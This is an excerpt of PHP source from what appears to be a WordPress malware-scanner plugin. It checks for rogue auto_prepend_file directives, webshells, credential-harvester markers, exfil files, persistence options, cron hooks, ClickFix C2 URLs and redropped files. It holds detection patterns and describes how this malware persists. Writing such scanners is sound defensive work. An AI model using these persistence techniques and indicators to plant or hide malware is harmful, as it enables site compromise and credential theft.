			// .htaccess:  php_value auto_prepend_file "/path/to/file.php"
			if ( ! preg_match_all(
				'/(?:^|\s)(?:php_value\s+|php_admin_value\s+)?auto_prepend_file\s*=?\s*["\']?([^\s"\'\r\n]+)/i',
				$cfg_contents,
				$matches
			) ) {
				continue;
			}
			foreach ( $matches[1] as $value ) {
				$value = trim( $value );
				if ( $value === '' || strtolower( $value ) === 'none' ) {
					continue;
				}
				$base       = strtolower( basename( str_replace( '\\', '/', $value ) ) );
				$is_allowed = ( $base === 'wordfence-waf.php' );

				$value_real = realpath( $value );
				$value_norm = $value_real ? rtrim( str_replace( '\\', '/', $value_real ), '/' ) : '';
				$in_tree    = $value_norm !== '' && strpos( $value_norm, $abspath_norm . '/' ) === 0;

				if ( ! $is_allowed || ( $value_real && ! $in_tree ) ) {
					$finding = [
						'severity' => 'critical',
						'type'     => $cfg_name . ' sets auto_prepend_file to a non-canonical path',
						'subject'  => $cfg_name . ' auto_prepend_file = ' . $value,
						'path'     => $cfg_path,
						'match'    => $value,
						'action'   => 'Edit ' . $cfg_name . ' manually and remove or correct the auto_prepend_file directive. Confirm there is no second prepend pointing at attacker-controlled storage.',
					];
					// 1.3.67: only .user.ini gets a clean_strategy. .htaccess is
					// frequently operator-edited and contains a wide variety of
					// rewrite rules whose interaction with surgical line-removal
					// is unpredictable; we leave .htaccess findings as
					// instruction-only. .user.ini is a narrowly-scoped PHP-config
					// file and the auto_prepend_file directive is removable as a
					// single line without affecting other directives.
					if ( $cfg_name === '.user.ini' ) {
						$finding['clean_strategy'] = 'user_ini_prepend';
						$finding['action']         = 'Use the Clean injection button to remove the auto_prepend_file directive from .user.ini; or edit .user.ini manually. Confirm there is no second prepend pointing at attacker-controlled storage.';
					}
					$found[] = $finding;
				}
			}
		}

		//  3. ABSPATH-root files: catch both the toolkit files themselves AND
		//      PHP files that reference them. Uses scandir() rather than glob()
		//      because glob with the '*.php' pattern does not match leading-dot
		//      hidden filenames such as '.wp-config-cache.php'.
		$toolkit_filenames = WPS_Indicators::secondary_backdoor_filenames();
		$root_entries      = @scandir( ABSPATH );
		if ( is_array( $root_entries ) ) {
			foreach ( $root_entries as $entry ) {
				if ( $entry === '.' || $entry === '..' ) {
					continue;
				}
				$entry_path = ABSPATH . $entry;
				if ( ! is_file( $entry_path ) ) {
					continue;
				}

				// 3a. The file itself is a known toolkit filename (exact basename match).
				//     Catches a standalone .wp-config-cache.php / wp-security-cache.php /
				//     wp-phpunit.php at WordPress root, even if nothing else references
				//     it yet (e.g., before the auto_prepend wiring is in place, or after
				//     an operator partially cleaned up).
				if ( in_array( $entry, $toolkit_filenames, true ) ) {
					$found[] = [
						'severity'    => 'critical',
						'type'        => '.sbs toolkit file present at WordPress root',
						'subject'     => $entry . ' at ABSPATH',
						'path'        => $entry_path,
						'match'       => $entry,
						'action'      => 'Auto-deleted because the basename is on the secondary-backdoor list and ABSPATH-root location has no benign explanation. After deletion: confirm auto_prepend_file directives and the includes inside wordfence-waf.php do not reference it; run Hardening > Regenerate auth salts.',
						'auto_delete' => true, // 1.3.50: auto-delete confirmed-malicious filename at canonical-malicious location
						'delete_path' => $entry_path,
					];
					continue; // already flagged; do not scan content
				}

				// 3b. PHP files at root that REFERENCE a toolkit filename in their content.
				//     wp-config.php has its own dedicated checks; skip it here.
				if ( $entry === 'wp-config.php' ) {
					continue;
				}
				if ( substr( $entry, -4 ) !== '.php' ) {
					continue;
				}
				if ( ! is_readable( $entry_path ) ) {
					continue;
				}
				$contents = @file_get_contents( $entry_path );
				if ( ! is_string( $contents ) || $contents === '' ) {
					continue;
				}
				foreach ( $toolkit_filenames as $tk ) {
					if ( strpos( $contents, $tk ) !== false ) {
						$found[] = [
							'severity' => 'critical',
							'type'     => 'ABSPATH-root PHP file references .sbs toolkit filename',
							'subject'  => $entry . ' references ' . $tk,
							'path'     => $entry_path,
							'match'    => $tk,
							'action'   => 'Inspect this file manually and remove the malicious include or string. Confirm auto_prepend_file is not pointing at this file. Run Hardening > Regenerate auth salts.',
						];
						break; // one finding per file is sufficient
					}
				}
			}
		}

		return $found;
	}

	/**
	 * Scan WordPress root (ABSPATH non-recursive) for PHP files whose contents
	 * match any signature in SIGNATURES_PERF, SIGNATURES_ANTY, or SIGNATURES_BACKDOOR
	 * (added 1.3.36).
	 *
	 * The other walkers cover descendants of wp-content/ and a few specific
	 * ABSPATH-root files (wp-config.php, wp-cron.php, wp-login.php, wordfence-waf.php).
	 * A standalone PHP webshell dropped at the WordPress root next to wp-config.php
	 * (with any name not on the secondary_backdoor_filenames list) would slip
	 * past every other check. This walker runs the full signature catalogue
	 * against every PHP file at ABSPATH root  cheap (typically 5-15 files)
	 * and broad enough to catch renamed copies of known webshells.
	 *
	 * Uses scandir() rather than glob() so leading-dot hidden files are visible.
	 * Skips wp-config.php (dedicated checks) and the canonical "Silence is golden"
	 * directory-listing guard at ABSPATH/index.php.
	 *
	 * @return array<int, array<string, string>>
	 */
	private static function check_root_file_signatures(): array {
		$found = [];
		$entries = @scandir( ABSPATH );
		if ( ! is_array( $entries ) ) {
			return $found;
		}

		$signatures = array_merge(
			self::SIGNATURES_PERF,
			self::SIGNATURES_ANTY,
			self::SIGNATURES_BACKDOOR
		);

		foreach ( $entries as $entry ) {
			if ( $entry === '.' || $entry === '..' ) {
				continue;
			}
			if ( $entry === 'wp-config.php' ) {
				continue; // dedicated checks handle this
			}
			if ( substr( $entry, -4 ) !== '.php' ) {
				continue;
			}
			$path = ABSPATH . $entry;
			if ( ! is_file( $path ) || ! is_readable( $path ) ) {
				continue;
			}
			$contents = @file_get_contents( $path );
			if ( ! is_string( $contents ) || $contents === '' ) {
				continue;
			}
			// Skip the canonical "Silence is golden" directory-listing guard.
			if ( strlen( $contents ) < 80 && strpos( $contents, 'Silence is golden' ) !== false ) {
				continue;
			}

			$hits = [];
			foreach ( $signatures as $sig ) {
				if ( strpos( $contents, $sig ) !== false ) {
					$hits[] = $sig;
					if ( count( $hits ) >= 5 ) {
						break;
					}
				}
			}

			if ( $hits ) {
				// 1.3.50: if the matched file is also a known-bad filename
				// (i.e. it is in `secondary_backdoor_filenames()`), the combo
				// of canonical malicious basename + ABSPATH-root location +
				// content signature match is unambiguous. Auto-delete is
				// safe. If the basename is NOT in the known-bad list (e.g.
				// signature found in wp-blog-header.php), keep the finding
				// as `Needs action` so the operator can review before the
				// scanner removes a file that may be a tampered core file
				// rather than a planted shell.
				$is_known_backdoor_basename = in_array(
					strtolower( $entry ),
					array_map( 'strtolower', WPS_Indicators::secondary_backdoor_filenames() ),
					true
				);

				$finding = [
					'severity' => 'critical',
					'type'     => 'malware signature in WordPress root PHP file',
					'subject'  => $entry,
					'path'     => $path,
					'match'    => implode( ', ', $hits ),
					'action'   => $is_known_backdoor_basename
						? 'Auto-deleted because the basename is on the secondary-backdoor list and the file content matched a known malware signature. After deletion: run Hardening > Regenerate auth salts. If this file had a setmtime capability (e.g., the wp-default.php standalone file manager webshell), on-disk file modification times across the whole site may have been altered  do not rely on mtimes for forensic timeline reconstruction.'
						: 'Inspect this file manually and delete via Remediation > Delete file. Then run Hardening > Regenerate auth salts. If this file has a setmtime capability (e.g., the wp-default.php standalone file manager webshell), on-disk file modification times across the whole site may have been altered  do not rely on mtimes for forensic timeline reconstruction.',
				];

				if ( $is_known_backdoor_basename ) {
					$finding['auto_delete'] = true;
					$finding['delete_path'] = $path;
				}

				$found[] = $finding;
			}
		}

		return $found;
	}

	/** @return array<int, array<string, string>> */
	private static function check_login_injection(): array {
		$found    = [];
		$login    = ABSPATH . 'wp-login.php';
		if ( ! file_exists( $login ) || ! is_readable( $login ) ) {
			return $found;
		}
		$contents = @file_get_contents( $login );
		if ( ! $contents ) {
			return $found;
		}
		if ( strpos( $contents, 'd3AtY29udGVudC91cGxvYWRz' ) !== false ) {
			$found[] = [
				'severity' => 'critical',
				'type'     => 'wp-login.php credential harvester injection detected',
				'subject'  => 'wp-login.php',
				'path'     => $login,
				'action'   => 'Use Remediation tab > Clean wp-login.php',
			];
		}
		return $found;
	}

	/** @return array<int, array<string, string>> */
	private static function check_exfil_file(): array {
		$found      = [];
		$upload_dir = wp_upload_dir();
		$base       = $upload_dir['basedir'] ?? '';
		if ( ! $base || ! is_dir( $base ) ) {
			return $found;
		}
		$exfil_names = WPS_Indicators::exfil_filenames();
		try {
			$iter = new RecursiveIteratorIterator(
				new RecursiveDirectoryIterator( $base, FilesystemIterator::SKIP_DOTS ),
				RecursiveIteratorIterator::LEAVES_ONLY
			);
			foreach ( $iter as $file ) {
				if ( ! ( $file instanceof SplFileInfo ) ) continue;
				if ( in_array( $file->getFilename(), $exfil_names, true ) ) {
					$found[] = [
						'severity'    => 'critical',
						'type'        => 'Credential exfil file found (fake PNG containing harvested logins)',
						'subject'     => $file->getFilename(),
						'path'        => $file->getPathname(),
						'action'      => 'Use Remediation tab > Delete exfil file',
						'auto_delete' => true,
						'delete_path' => $file->getPathname(),
					];
				}
			}
		} catch ( \Exception $e ) {
			WPS_Logger::write( 'Exfil scan error: ' . $e->getMessage() );
		}
		return $found;
	}

	/**
	 * NEW: Scan wp_options for malware-set persistence keys.
	 *
	 * Critical: wp_session_tokens_config stores a base64-encoded copy of the
	 * MU plugin which the RAT (mode r) auto-restores to mu-plugins/session-manager.php
	 * if that file is deleted. Deleting the file without deleting this DB option
	 * achieves nothing  the RAT will restore itself on next request.
	 *
	 * @return array<int, array<string, string>>
	 */
	private static function check_malicious_db_options(): array {
		$found = [];
		$autoclean = self::auto_delete_enabled();

		// Single source of truth: the same catalogue the manual "Delete malicious
		// DB options" button uses, so detection, auto-clean and the manual button
		// can never drift apart (this previously duplicated, and drifted from, the
		// WPS_Indicators list  it was missing several catalogued _cfg variants).
		$bad_options = WPS_Indicators::malware_option_keys();

		foreach ( $bad_options as $opt ) {
			$val = get_option( $opt, null );
			if ( $val === null ) {
				continue;
			}
			$preview      = is_string( $val ) ? substr( $val, 0, 80 ) : '(non-string value)';
			$is_mu_backup = ( $opt === 'wp_session_tokens_config' || $opt === 'session_tokens_config' );
			$entry = [
				'severity' => 'critical',
				'type'     => $is_mu_backup
					? 'Malicious DB option: MU plugin backup (RAT will auto-restore from this)'
					: 'Malicious DB option found in wp_options',
				'subject'  => $opt,
				'path'     => '',
				'preview'  => $preview,
			];
			// 1.3.86: known-bad options are the highest-confidence DB malware in the
			// plugin, so they auto-clean through the same toggle as files and the
			// 1.3.85 base64 options. The manual button remains the off-toggle path.
			if ( $autoclean ) {
				if ( self::quarantine_enabled() && class_exists( 'WPS_Quarantine' ) ) {
					WPS_Quarantine::quarantine_option( $opt, [ 'type' => 'db_option (known-bad key)', 'reason' => 'auto-clean of known-bad wp_options key' ] );
				}
				delete_option( $opt );
				$entry['remediated'] = true;
				$entry['action']     = 'Auto-deleted by WP Perf Shield (known-bad wp_options key).';
				WPS_Logger::log_event( 'db_option_deleted', $opt . ' (auto)' );
			} else {
				$entry['action'] = $is_mu_backup
					? 'Auto-clean is off. Use "Delete malicious DB options" on the Remediation tab  MUST do this or the mu-plugin will be restored.'
					: 'Auto-clean is off. Use "Delete malicious DB options" on the Remediation tab.';
			}
			$found[] = $entry;
		}

		// Malicious cron hooks: same toggle, same source list as the manual
		// handler's cron sweep. Purge when auto-clean is on; flag for the manual
		// button when it is off so the hook is still visible in the scan.
		if ( function_exists( '_get_cron_array' ) ) {
			$crons    = _get_cron_array();
			$bad_subs = WPS_Indicators::malicious_cron_hook_substrings();
			$seen     = [];
			if ( is_array( $crons ) ) {
				foreach ( $crons as $hooks ) {
					if ( ! is_array( $hooks ) ) {
						continue;
					}
					foreach ( $hooks as $hook => $args ) {
						if ( isset( $seen[ $hook ] ) ) {
							continue;
						}
						$lower = strtolower( (string) $hook );
						$hit   = false;
						foreach ( $bad_subs as $bad ) {
							if ( $bad !== '' && strpos( $lower, $bad ) !== false ) {
								$hit = true;
								break;
							}
						}
						if ( ! $hit ) {
							continue;
						}
						$seen[ $hook ] = true;
						$entry = [
							'severity' => 'critical',
							'type'     => 'Malicious cron hook scheduled by malware',
							'subject'  => (string) $hook,
							'path'     => '',
						];
						if ( $autoclean ) {
							wp_unschedule_hook( $hook );
							$entry['remediated'] = true;
							$entry['action']     = 'Auto-removed by WP Perf Shield (malicious cron hook).';
							WPS_Logger::log_event( 'cron_purged', $hook . ' (auto)' );
						} else {
							$entry['action'] = 'Auto-clean is off. Use "Delete malicious DB options" on the Remediation tab to remove this cron hook.';
						}
						$found[] = $entry;
					}
				}
			}
		}

		return $found;
	}

	/**
	 * Hunt for ClickFix second-stage C2 URLs embedded in the family's
	 * `wp_<10hex>_cfg` option payloads (added 1.3.69).
	 *
	 * The render-hijacker stores its base64 JavaScript payload in an option
	 * named `wp_<10hex>_cfg`. When the campaign's clipboard PowerShell stage
	 * carries its download callback in cleartext inside that script, the C2
	 * URL is recoverable straight from the option value after one base64
	 * decode. The captured callback shape is:
	 *
	 *   https://<host>/api/index.php?a=dl&token=<64-hex>&src=<victim>&mode=cloudflare
	 *
	 * This is the closest a server-side scanner gets to naming the malware's
	 * distribution source, because the PowerShell itself never lands on the
	 * WordPress filesystem. Detection works two ways and is independent of any
	 * single host:
	 *
	 *   1. A structural regex on the download-action + long-hex-token shape,
	 *      which matches new C2 hosts the catalogue has never seen.
	 *   2. A literal check against the known download-C2 host list.
	 *
	 * The option_name scan uses a LIKE prefilter then a strict
	 * `wp_<10hex>_cfg` match in PHP, so variants whose specific option key is
	 * not yet in the indicator catalogue are still inspected. The value is
	 * tested raw and after a strict base64 decode. Deeper-obfuscated builds
	 * that further encode the C2 inside the script will not match here; this
	 * fires only when the callback is present in cleartext after the decode.
	 *
	 * @return array<int, array<string, string>>
	 */
	private static function check_clickfix_c2_in_options(): array {
		global $wpdb;
		$found = [];
		if ( ! isset( $wpdb ) || ! is_object( $wpdb ) ) {
			return $found;
		}

		// Structural C2 download-URL signature: a download action plus a long
		// hex token in the same URL. Tolerant of parameter order and host.
		$url_re = "#https?://[a-z0-9.\\-]+/[^\\s'\"<>]*[?&]a=dl&token=[a-f0-9]{32,128}[^\\s'\"<>]*#i";

		$known_c2 = method_exists( 'WPS_Indicators', 'clickfix_download_c2_domains' )
			? WPS_Indicators::clickfix_download_c2_domains()
			: [];

		$known_tokens = method_exists( 'WPS_Indicators', 'clickfix_campaign_tokens' )
			? WPS_Indicators::clickfix_campaign_tokens()
			: [];

		$ether_terms = method_exists( 'WPS_Indicators', 'etherhiding_indicators' )
			? WPS_Indicators::etherhiding_indicators()
			: [];

		// Pull candidate option rows: the family's wp_<10hex>_cfg shape.
		$like = $wpdb->esc_like( 'wp_' ) . '%' . $wpdb->esc_like( '_cfg' );
		$rows = $wpdb->get_results(
			$wpdb->prepare(
				"SELECT option_name, option_value FROM {$wpdb->options} WHERE option_name LIKE %s",
				$like
			),
			ARRAY_A
		);
		if ( ! is_array( $rows ) ) {
			return $found;
		}

		foreach ( $rows as $row ) {
			$name = (string) ( $row['option_name'] ?? '' );
			if ( ! preg_match( '/^wp_[a-f0-9]{10}_cfg$/', $name ) ) {
				continue; // only the family's option-key shape
			}
			$raw = (string) ( $row['option_value'] ?? '' );
			if ( $raw === '' ) {
				continue;
			}

			// Inspect the raw value and a strict base64 decode of it.
			$candidates = [ $raw ];
			$decoded = base64_decode( $raw, true );
			if ( is_string( $decoded ) && $decoded !== '' ) {
				$candidates[] = $decoded;
			}

			$hit_url    = '';
			$hit_domain = '';
			$hit_token  = '';
			$hit_ether  = '';
			foreach ( $candidates as $blob ) {
				if ( $hit_url === '' && preg_match( $url_re, $blob, $m ) ) {
					$hit_url = $m[0];
				}
				if ( $hit_domain === '' ) {
					foreach ( $known_c2 as $dom ) {
						if ( $dom !== '' && stripos( $blob, $dom ) !== false ) {
							$hit_domain = $dom;
							break;
						}
					}
				}
				if ( $hit_token === '' ) {
					foreach ( $known_tokens as $tok ) {
						if ( $tok !== '' && stripos( $blob, $tok ) !== false ) {
							$hit_token = $tok;
							break;
						}
					}
				}
				if ( $hit_ether === '' ) {
					foreach ( $ether_terms as $et ) {
						if ( $et !== '' && stripos( $blob, $et ) !== false ) {
							$hit_ether = $et;
							break;
						}
					}
				}
				if ( $hit_url !== '' && $hit_domain !== '' && $hit_token !== '' && $hit_ether !== '' ) {
					break;
				}
			}

			if ( $hit_url === '' && $hit_domain === '' && $hit_token === '' && $hit_ether === '' ) {
				continue;
			}

			// Recover the victim/source domain stamped in the callback, if present.
			$src = '';
			if ( $hit_url !== '' && preg_match( '/[?&]src=([^&\s\'"<>]+)/i', $hit_url, $sm ) ) {
				$src = $sm[1];
			}

			$detail = $hit_url !== '' ? $hit_url : ( $hit_domain !== '' ? ( 'C2 host ' . $hit_domain ) : ( $hit_token !== '' ? ( 'campaign token ' . $hit_token ) : ( 'EtherHiding BSC fetch: ' . $hit_ether ) ) );
			$found[] = [
				'severity' => 'critical',
				'type'     => ( $hit_ether !== '' && $hit_url === '' && $hit_domain === '' )
					? 'EtherHiding (Binance Smart Chain) payload in malware DB option'
					: 'ClickFix C2 download URL embedded in malware DB option',
				'subject'  => $name,
				'path'     => '',
				'action'   => 'Confirmed infection. Delete this option (Remediation tab > Delete malicious DB options), remove the injecting plugin/file, and block the C2 host at the firewall/edge.'
					. ( $src !== '' ? ' Callback names served-from site: ' . $src . '.' : '' )
					. ( $hit_ether !== '' ? ' This payload fetches its next stage from a Binance Smart Chain smart contract (EtherHiding, term: ' . $hit_ether . '); the on-chain stage cannot be taken down, so closing the entry point and removing the option/injector is the only remedy.' : '' ),
				'preview'  => substr( $detail, 0, 200 ),
				'match'    => $hit_domain !== '' ? $hit_domain : ( $hit_token !== '' ? 'campaign-token' : ( $hit_ether !== '' ? 'etherhiding' : 'a=dl+token' ) ),
			];
		}

		return $found;
	}

	/**
	 * Surface the 1.3.40 behavioural Forensics findings into the hourly scan
	 * (added 1.3.41).
	 *
	 * The three classifier-driven checks added in 1.3.40 (auto_prepend sweep,
	 * unknown-base64 wp_options sweep, cron callback resolution) only ran when
	 * the operator clicked Run forensics. That is fine for a hot incident, but
	 * a dropper that runs once an hour against an idle site is exactly the
	 * case where unattended detection matters. This wrapper calls the three
	 * Forensics methods, translates each structured finding into the scanner's
	 * canonical finding shape, and lets the existing notify_admin / Overview /
	 * Source-Trace flow pick them up. Severity is mapped per verdict so only
	 * genuinely high-confidence anomalies trigger the rate-limited admin email.
	 *
	 * The Forensics methods used here are read-only and bounded; running them
	 * every hour adds well under a second of work on a healthy site.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_dropper_persistence(): array {
		$found = [];

		// Forensics methods exist as private statics; we call them via a thin
		// public wrapper that the Forensics class exposes for scanner reuse.
		if ( ! class_exists( 'WPS_Forensics' ) || ! method_exists( 'WPS_Forensics', 'dropper_persistence_findings' ) ) {
			return $found;
		}

		$report = WPS_Forensics::dropper_persistence_findings();
		if ( ! is_array( $report ) ) return $found;

		// auto_prepend_anomalies: 'critical' verdict -> critical severity,
		// 'review' verdict -> high severity (not auto-suppressed because the
		// operator may have unexpected hosting agents).
		foreach ( (array) ( $report['auto_prepend_anomalies'] ?? [] ) as $a ) {
			$verdict = (string) ( $a['verdict'] ?? 'review' );
			$severity = $verdict === 'critical' ? 'critical' : 'high';
			$found[] = [
				'severity' => $severity,
				'type'     => 'auto_prepend_directive (' . $verdict . ')',
				'subject'  => (string) ( $a['config_file'] ?? '?' ) . ' -> ' . (string) ( $a['target'] ?? '?' ),
				'path'     => (string) ( $a['config_file'] ?? '' ),
				'action'   => (string) ( $a['action'] ?? 'Open the config file and remove the directive.' ),
			];
		}

		// unknown_base64_options: both verdicts are critical because the
		// classifier already requires structural confirmation that the decoded
		// blob is PHP source or the ClickFix outer-JS shape. 1.3.85: because the
		// content is confirmed, these are treated like any other confirmed
		// artefact  auto-cleaned in this pass when auto-remediation is enabled,
		// flagged for the Forensics "Delete all" / per-option button when it is
		// off. The LIVE option is re-validated before deletion so a stale cached
		// report can never drive a delete.
		$b64_autoclean = self::auto_delete_enabled();
		foreach ( (array) ( $report['unknown_base64_options'] ?? [] ) as $o ) {
			$verdict = (string) ( $o['verdict'] ?? 'review' );
			$opt     = (string) ( $o['option_name'] ?? '?' );
			$entry   = [
				'severity' => 'critical',
				'type'     => 'unknown_base64_option (' . $verdict . ')',
				'subject'  => $opt,
				'path'     => '',
				'preview'  => (string) ( $o['preview'] ?? '' ),
			];
			if ( $b64_autoclean && $opt !== '' && $opt !== '?'
				&& WPS_Forensics::confirm_base64_option_verdict( $opt ) !== '' ) {
				if ( self::quarantine_enabled() && class_exists( 'WPS_Quarantine' ) ) {
					WPS_Quarantine::quarantine_option( $opt, [ 'type' => 'db_option (base64 payload)', 'reason' => 'auto-clean of confirmed base64 payload option' ] );
				}
				delete_option( $opt );
				$entry['remediated'] = true;
				$entry['action']     = 'Auto-deleted by WP Perf Shield (confirmed base64 payload option).';
				WPS_Logger::log_event( 'db_option_deleted_unknown_b64', $opt . ' (auto)' );
			} else {
				$entry['action'] = $b64_autoclean
					? 'Confirmed base64 payload option. Re-run Forensics if it persists on disk.'
					: 'Auto-clean is off. Use "Delete all flagged options" on the Forensics tab (or Delete-now per option).';
			}
			$found[] = $entry;
		}

		// cron_callbacks: critical for substring/backdoor matches; high for
		// outside_expected_dirs (the dropper-hideout case); medium for missing
		// or unresolvable callbacks (low-confidence noise unless paired with
		// other findings).
		$severity_by_verdict = [
			'malicious_substring'      => 'critical',
			'known_backdoor_filename'  => 'critical',
			'outside_expected_dirs'    => 'high',
			'evald_code'               => 'high',   // 1.4.11: handler exists only in eval()'d code - no file to scan
			'missing_file'             => 'medium',
			'unresolvable'             => 'medium',
		];
		foreach ( (array) ( $report['cron_callbacks'] ?? [] ) as $c ) {
			$verdict  = (string) ( $c['verdict'] ?? 'outside_expected_dirs' );
			$severity = $severity_by_verdict[ $verdict ] ?? 'high';
			$found[] = [
				'severity' => $severity,
				'type'     => 'cron_callback (' . $verdict . ')',
				'subject'  => (string) ( $c['hook'] ?? '?' ) . ' -> ' . (string) ( $c['callback'] ?? '?' ),
				'path'     => (string) ( $c['source'] ?? '' ),
				'action'   => (string) ( $c['action'] ?? 'Inspect the source file and remove the cron event.' ),
			];
		}

		return $found;
	}

	//  Redrop detection (1.3.42) 
	//
	// Persist the SHA-256 of every file the auto-remediator successfully
	// deletes, then on every subsequent scan walk wp-content/ and flag any
	// PHP file whose hash matches an entry in the persisted history. The
	// reappearance of a byte-identical previously-cleaned file has no
	// benign explanation; the alert wakes the operator instead of letting
	// the next variant cycle silently.
	//
	// Tuning:
	//   - Records expire after 30 days (REDROP_TTL_SECONDS).
	//   - History caps at 500 entries; oldest deleted_at is evicted first.
	//   - Per-file size cap of 200 KiB skips legitimate large theme/plugin
	//     assets and bounds hashing cost on any one file.
	//   - Per-scan file cap of 5000 files bounds total work.
	//   - Files modified before the oldest deleted_at in history are skipped
	//     (they cannot be a redrop of anything we have recorded).
	//   - The plugin's own directory is excluded from both recording and
	//     scanning so its own indicator strings do not self-match.

	const REDROP_OPTION         = 'wps_redrop_history';
	const REDROP_TTL_SECONDS    = 2592000; // 30 days
	const REDROP_MAX_RECORDS    = 500;
	const REDROP_MAX_FILE_BYTES = 204800;  // 200 KiB
	const REDROP_MAX_SCAN_FILES = 5000;

	/**
	 * 1.3.98: wall-clock budget for one scan pass, in seconds. Checks that
	 * have not STARTED when the budget is exhausted are skipped and named in a
	 * scan_budget_exhausted finding; a running check is never interrupted.
	 * 45s sits under the common 60s max_execution_time with headroom for
	 * auto-remediation and caching after the checks finish.
	 */
	/**
	 * Ceiling for the scan's own time budget.
	 *
	 * 1.4.46: this used to BE the budget, at a flat 45 seconds. On a host
	 * where max_execution_time is 30 that is a guaranteed fatal - the scan's
	 * self-imposed limit sits above the limit PHP kills it at, so it can never
	 * stop itself in time and the fail-safe catches a timeout instead. It is
	 * now a ceiling, and the effective budget is derived from what PHP will
	 * actually allow. See scan_budget_seconds().
	 */
	const SCAN_TIME_BUDGET_SECONDS = 45;

	/** Never leave less than this for the rest of the request. */
	const SCAN_BUDGET_HEADROOM = 8;

	// 1.3.87: PHP-inventory drift tripwire. Extensions PHP will execute, and the
	// option that stores the clean baseline (realpath => sha256). Autoload off.
	const PHP_INVENTORY_EXTS            = [ 'php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'phps', 'pht', 'phar' ];
	const PHP_INVENTORY_BASELINE_OPTION = 'wps_php_inventory_baseline';
	const PHP_INVENTORY_MAX_VISIT       = 100000;

	// 1.3.89: plugin integrity against the wordpress.org checksums API. Checksums
	// for a given slug+version never change, so cache them for a week; cap network
	// fetches per scan so a fresh install does not fire dozens of requests at once.
	const PLUGIN_CHECKSUMS_TTL       = 604800; // 7 days
	const PLUGIN_CHECKSUMS_FETCH_CAP = 8;
	const REDROP_DIR_PHP_CAP    = 20;

	/**
	 * Compute SHA-256 hashes of the file (or PHP files inside the directory)
	 * the auto-remediator is about to delete. Bounded so this cannot blow
	 * up on a victim's legitimately-large compromised plugin directory.
	 *
	 * @return array<int, array{hash: string, path: string}>
	 */
	private static function compute_redrop_hashes( string $target ): array {
		$out = [];
		if ( $target === '' ) return $out;

		if ( is_file( $target ) ) {
			if ( @filesize( $target ) > self::REDROP_MAX_FILE_BYTES ) return $out;
			$hash = @hash_file( 'sha256', $target );
			if ( $hash ) $out[] = [ 'hash' => $hash, 'path' => $target ];
			return $out;
		}

		if ( ! is_dir( $target ) ) return $out;

		$count = 0;
		try {
			$iter = new RecursiveIteratorIterator(
				new RecursiveDirectoryIterator( $target, FilesystemIterator::SKIP_DOTS ),
				RecursiveIteratorIterator::LEAVES_ONLY
			);
			foreach ( $iter as $f ) {
				if ( ++$count > self::REDROP_DIR_PHP_CAP ) break;
				if ( ! ( $f instanceof SplFileInfo ) ) continue;
				if ( ! self::is_php_executable( $f ) ) continue;
				if ( $f->getSize() > self::REDROP_MAX_FILE_BYTES ) continue;
				$hash = @hash_file( 'sha256', $f->getPathname() );
				if ( $hash ) $out[] = [ 'hash' => $hash, 'path' => $f->getPathname() ];
			}
		} catch ( \Exception $e ) {}
		return $out;
	}

	/**
	 * Persist a baseline record for each pre-computed hash. Idempotent:
	 * if the same hash is already known, the deleted_at timestamp is
	 * refreshed but redrop_count and family carry over from the original
	 * record so the alert history is preserved across re-deletions.
	 *
	 * @param array<int, array{hash: string, path: string}> $hashes
	 * @param array<string, mixed> $finding
	 */
	private static function record_redrop_baseline( array $hashes, array $finding ): void {
		if ( empty( $hashes ) ) return;
		$family = (string) ( $finding['type'] ?? 'unknown' );
		$now = time();

		$history = self::load_redrop_history();
		foreach ( $hashes as $h ) {
			$hash = $h['hash'];
			$path = $h['path'];
			if ( isset( $history[ $hash ] ) ) {
				$history[ $hash ]['deleted_at'] = $now;
			} else {
				$history[ $hash ] = [
					'hash'             => $hash,
					'original_path'    => $path,
					'family'           => $family,
					'deleted_at'       => $now,
					'redrop_count'     => 0,
					'last_redrop_at'   => 0,
					'last_redrop_path' => '',
				];
				WPS_Logger::log_event(
					'redrop_recorded',
					'hash=' . substr( $hash, 0, 16 ) . '... family=' . $family . ' path=' . $path
				);
			}
		}

		self::save_redrop_history( $history );
	}

	/**
	 * Scan wp-content/ for PHP files whose SHA-256 matches an entry in the
	 * redrop history. A match means a previously-deleted byte-identical
	 * malware sample has been recreated on disk; the only realistic
	 * explanation is an active dropper.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_redrop(): array {
		$found = [];
		self::prune_redrop_history();
		$history = self::load_redrop_history();
		if ( empty( $history ) ) return $found;

		$known_hashes = array_fill_keys( array_keys( $history ), true );
		$self_dir     = realpath( WPS_DIR ) ?: '';

		// Mtime threshold: any file last modified before the oldest
		// deleted_at in history cannot be a redrop of anything we have
		// recorded. Cheap pre-filter that lets the hash work scale with
		// modification activity rather than total file count.
		$oldest_deleted_at = PHP_INT_MAX;
		foreach ( $history as $rec ) {
			$d = (int) ( $rec['deleted_at'] ?? 0 );
			if ( $d > 0 && $d < $oldest_deleted_at ) $oldest_deleted_at = $d;
		}
		if ( $oldest_deleted_at === PHP_INT_MAX ) return $found;

		$count = 0;
		$matches_changed = false;

		// One matcher, driven from two roots. Returns false only to signal the
		// shared scan budget is exhausted so the caller stops iterating.
		$scan_one = function ( $f ) use ( &$count, &$found, &$history, &$matches_changed, $known_hashes, $oldest_deleted_at, $self_dir ): bool {
			if ( ++$count > self::REDROP_MAX_SCAN_FILES ) return false;
			if ( ! self::is_php_executable( $f ) ) return true;
			if ( $f->getSize() > self::REDROP_MAX_FILE_BYTES ) return true;
			if ( $f->getMTime() < $oldest_deleted_at ) return true;

			$path = $f->getPathname();
			$real = realpath( $path );
			if ( $self_dir !== '' && $real && ( $real === $self_dir || WPS_Utils::path_is_inside( $real, WPS_DIR ) ) ) return true;
			if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $path ) ) return true; // 1.3.94: never re-scan the store

			$hash = @hash_file( 'sha256', $path );
			if ( ! $hash || ! isset( $known_hashes[ $hash ] ) ) return true;

			$rec = $history[ $hash ];
			$found[] = [
				'severity'    => 'critical',
				'type'        => 'redrop_detected (' . $rec['family'] . ')',
				'subject'     => 'Previously-deleted hash ' . substr( $hash, 0, 16 ) . '... reappeared',
				'path'        => $path,
				'action'      => 'Confirmed re-drop. The file is byte-identical to a sample WP Perf Shield previously deleted at '
					. gmdate( 'Y-m-d H:i:s', (int) $rec['deleted_at'] ) . ' UTC. Find and remove the dropper that recreated it; '
					. 'a hash-blocked file does not reappear without an active redropper. Run Forensics, check auto_prepend / cron / unknown_base64 cards, and consider an inotifywait watch on wp-content and the web root.',
				'auto_delete' => true,
				'delete_path' => $path,
